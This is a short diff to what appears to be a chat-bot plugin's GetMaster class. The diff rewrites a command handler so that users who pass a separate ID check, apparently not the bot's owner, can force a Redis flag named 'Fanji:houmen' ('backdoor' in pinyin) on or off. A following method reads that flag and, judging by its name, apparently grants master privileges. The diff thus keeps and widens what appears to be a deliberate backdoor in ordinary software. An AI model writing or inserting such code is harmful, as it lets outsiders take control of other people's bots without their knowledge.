@@ -20,19 +20,19 @@ export class GetMaster extends plugin {
   }
 
 
-
-  async Masterkg(e) { 
-    if (!(e.isMaster ||cm.check(this.e.user_id))&& !e.msg.includes('强制')) {  
-        return await e.reply('你没有权限');  
-    } else {
-    if (!cm.check(this.e.user_id)) return await e.reply('你没有权限')
-
-    let open = e.msg.includes('开启');
-    await redis.set('Fanji:houmen', open ? 'true' : 'false');
-    await e.reply('设置完成');
-    return false;
-  }
-  }
+async Masterkg(e) {  
+    if (e.msg.includes('强制') && cm.check(this.e.user_id)) {  
+        let open = e.msg.includes('开启');  
+        await redis.set('Fanji:houmen', open ? 'true' : 'false');  
+        await e.reply('设置完成');  
+        return false
+    }
+    if (!e.isMaster) return await e.reply('你没有权限');  
+          let open = e.msg.includes('开启');  
+        await redis.set('Fanji:houmen', open ? 'true' : 'false');  
+        await e.reply('设置完成');  
+    return false;  
+}
 
   async Master(e) {
     let aw = await redis.get('Fanji:houmen');
